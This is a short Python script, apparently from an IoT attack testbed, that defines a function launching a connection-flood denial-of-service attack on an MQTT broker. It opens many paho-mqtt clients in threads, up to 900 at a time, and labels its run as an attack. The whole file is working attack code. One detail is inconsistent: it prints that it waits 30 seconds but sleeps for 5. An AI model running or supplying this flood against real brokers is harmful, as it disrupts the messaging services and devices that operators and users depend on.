import time
import sys
import threading
import paho.mqtt.client as mqtt

def create_client(broker, port, client_id):
    try:
        client = mqtt.Client(client_id)
        client.connect(broker, port, keepalive=60)
        client.loop_start()
        print(f"Client {client_id} connected")
    except Exception as e:
        print(f"Error creating client {client_id}: {e}")

def launch_attack_C(broker, port, num_clients, max_concurrent=900):
    print("Waiting for 30 seconds before starting the attack...")
    time.sleep(5)
    print("Starting the attack...")
    sys.stdout.flush()

    threads = []
    for i in range(num_clients):
        client_id = f'client_{i}'
        thread = threading.Thread(target=create_client, args=(broker, port, f'client_{i}'))
        threads.append(thread)
        thread.start()
        print(f"Thread {i} started++++++++++++++++++++++++++++++++")

        # Control the number of concurrences
        if (i + 1) % max_concurrent == 0:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()
    print("Attack finished")
    sys.stdout.flush()
